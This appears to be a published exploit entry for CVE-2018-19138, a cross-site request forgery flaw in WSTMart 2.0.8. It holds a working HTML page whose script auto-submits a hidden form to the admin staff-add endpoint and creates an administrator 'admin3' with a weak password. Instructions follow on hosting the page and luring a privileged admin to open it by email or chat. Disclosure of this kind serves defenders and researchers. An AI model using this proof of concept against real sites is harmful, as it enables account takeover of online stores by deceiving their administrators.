# Exploit Title:  WSTMart 2.0.8 - Cross-Site Request Forgery (Add Admin)
# Date: 2018-12-23
# Exploit Author: linfeng
# Vendor Homepage:https://github.com/wstmall/wstmart/
# Software Link:http://www.wstmart.net/
# Version:  WSTMart 2.0.8_181212  
# CVE :CVE-2018-19138

# 0x02 CSRF PoC
# 18/5000
# Function point: background management - staff management - login account
# poc:
# 1234.html

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
 <title>Document</title>
</head>
<body>
	<form action="http://xx.xx.xx.xx/st/wstmart_v2.0.8_181212/index.php/admin/staffs/add.html" id="test" name='test' method="POST">
		<input type="hidden" name='staffId' value="" />
		<input type="hidden" name='loginName' value="" />
		<input type="hidden" name='staffPhoto' value="" />
		<input type="hidden" name='loginPwd' value="" />
		<input type="hidden" name='staffName' value="" />
		<input type="hidden" name='staffNo' value="" />  
		<input type="hidden" name='RoleId' value="" />
		<input type="hidden" name='staffPhone' value="" />
		<input type="hidden" name='wxOpenId' value="" />
		<input type="hidden" name='workStatus' value="" />
		<input type="hidden" name='staffStatus' value="" />
	</form>

<script type="text/javascript">
test.staffId.value="0";
test.loginName.value="admin3";
test.staffPhoto.value="";  
test.loginPwd.value="admin3";
test.staffName.value="admin3";
test.staffNo.value=""; 
test.RoleId.value="0";
test.staffPhone.value="";
test.wxOpenId.value="";
test.workStatus.value="1";
test.staffStatus.value="1";
test.submit();
</script>
</body>
</html>



Instructions:

Preparation:
Install the Software:

Download and install WSTMart 2.0.8_181212 on your local server (e.g., localhost with XAMPP or similar setup).
Setup Test Environment:

Ensure that WSTMart is running and accessible from a browser.
Log in to the admin panel to verify the current user accounts and permissions.

Save the HTML code as 1234.html.
Replace http://xx.xx.xx.xx/st/wstmart_v2.0.8_181212/index.php/admin/staffs/add.html with the actual URL where WSTMart is hosted.
Host the 1234.html file on a web server or use a local file server if testing locally.

Share the URL to the 1234.html file with an admin or user with sufficient privileges. This could be done via email, chat, or any other method that the target might access.

After the admin or user visits the 1234.html page, check the admin panel to see if a new admin user with the details specified in the CSRF form (admin3) has been added.
